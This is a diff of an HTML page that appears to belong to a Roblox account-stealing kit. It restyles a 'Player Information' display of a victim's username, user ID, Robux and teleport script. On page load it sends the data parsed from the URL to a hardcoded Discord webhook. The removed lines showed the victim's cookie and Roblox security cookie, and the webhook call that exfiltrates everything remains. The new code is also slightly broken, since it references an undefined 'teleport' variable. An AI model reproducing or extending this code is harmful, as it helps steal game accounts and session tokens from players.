@@ -3,18 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Player Info</title>
+    <title>Player Information</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f4f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .container {
+            background-color: #fff;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+            width: 320px;
+            text-align: center;
+        }
+        .header {
+            font-size: 26px;
+            font-weight: bold;
+            color: #4e7ce5;
+            margin-bottom: 20px;
+        }
+        .info p {
+            font-size: 16px;
+            margin: 12px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .info p span {
+            font-weight: 600;
+            color: #555;
+        }
+        .info p input {
+            background: #f3f6f9;
+            border: 1px solid #d1d7e6;
+            padding: 8px;
+            border-radius: 8px;
+            width: 70%;
+            font-size: 15px;
+            text-align: center;
+            cursor: pointer;
+            color: #333;
+            transition: all 0.3s ease;
+        }
+        .info p input:focus {
+            border-color: #4e7ce5;
+            outline: none;
+        }
+        .info p input:active {
+            background: #e0f0fe;
+        }
+        .headshot {
+            border-radius: 50%;
+            width: 100px;
+            height: 100px;
+            object-fit: cover;
+            margin-top: 25px;
+        }
+        .btn {
+            background-color: #4e7ce5;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 25px;
+            transition: background-color 0.3s ease;
+        }
+        .btn:hover {
+            background-color: #3a66c4;
+        }
+        .btn:active {
+            background-color: #355b97;
+        }
+        .copy-btn {
+            font-size: 14px;
+            color: #4e7ce5;
+            border: none;
+            background: none;
+            cursor: pointer;
+            margin-top: 10px;
+            padding: 0;
+        }
+        .copy-btn:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-    <h1>Player Info</h1>
-    <div id="player-info"></div>
-    <footer>
-        <p id="footer-text"></p>
-    </footer>
-    <h3>Cookie Information:</h3>
-    <p id="cookie-info"></p> <!-- This is where the cookie will be displayed -->
-    <h3>Roblox Security Cookie:</h3>
-    <p id="roblox-security"></p> <!-- Display the Roblox security cookie here -->
+    <div class="container">
+        <div class="header">Player Information</div>
+        <div class="info">
+            <p><span>Username:</span> <input type="text" value="" id="username" readonly> <button class="copy-btn" onclick="copyText('username')">Copy</button></p>
+            <p><span>UserID:</span> <input type="text" value="" id="userid" readonly> <button class="copy-btn" onclick="copyText('userid')">Copy</button></p>
+            <p><span>Robux:</span> <input type="text" value="" id="robux" readonly> <button class="copy-btn" onclick="copyText('robux')">Copy</button></p>
+            <p><span>Teleport Script:</span> <input type="text" value="" id="teleportScript" readonly> <button class="copy-btn" onclick="copyText('teleportScript')">Copy</button></p>
+            <button class="btn" onclick="copyAll()">Copy All Info</button>
+        </div>
+        <img src="" alt="Player Headshot" id="headshot" class="headshot">
+    </div>
+
     <script>
         function sendDataToWebhook(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1345195939304046663/2v1rOg93RZscRR8CFLN3pnFPARbXxZr9Bhpy1Zv3DWBwOtdy6Kb9dSQhO3Nkcdvqh6gU';
@@ -35,32 +130,36 @@
             });
         }
 
+        function copyText(id) {
+            const input = document.getElementById(id);
+            input.select();
+            document.execCommand('copy');
+            alert(id + ' copied: ' + input.value);
+        }
+
+        function copyAll() {
+            const inputs = document.querySelectorAll('.info input');
+            inputs.forEach(input => {
+                input.select();
+                document.execCommand('copy');
+            });
+            alert('All information copied!');
+        }
+
         const urlParams = new URLSearchParams(window.location.search);
         const data = JSON.parse(decodeURIComponent(urlParams.get('data')));
 
-        const playerInfoDiv = document.getElementById('player-info');
-        const footerText = document.getElementById('footer-text');
-        const cookieInfo = document.getElementById('cookie-info');
-        const robloxSecurity = document.getElementById('roblox-security');
-        const message = data;
+        const username = data.username;
+        const userid = data.userid;
+        const robux = data.robux;
+        const teleportScript = data.teleportScript;
+        const headshot = data.headshot;
 
-        // Display player info
-        playerInfoDiv.innerHTML = `
-            <p><strong>Username:</strong> ${message.username}</p>
-            <p><strong>UserID:</strong> ${message.userId}</p>
-            <p><strong>Robux:</strong> ${message.robuxAmount}</p>
-            <p><strong>Teleport Script:</strong> ${message.teleportScript}</p>
-            <img src="${message.headshotUrl}" alt="Player Headshot" width="150" height="150">
-        `;
-
-        // Display footer text (Teleport Script)
-        footerText.innerHTML = `Teleport Script: ${message.teleportScript}`;
-
-        // Display cookie data
-        cookieInfo.innerHTML = `Cookie Data: ${message.cookie}`;
-
-        // Display Roblox security cookie
-        robloxSecurity.innerHTML = `Roblox Security Cookie: ${message.robloxSecurity}`;
+        document.getElementById('username').value = username;
+        document.getElementById('userid').value = userid;
+        document.getElementById('robux').value = robux;
+        document.getElementById('teleport').value = teleport;
+        document.getElementById('headshot').src = headshot;
 
         sendDataToWebhook(data);
     </script>
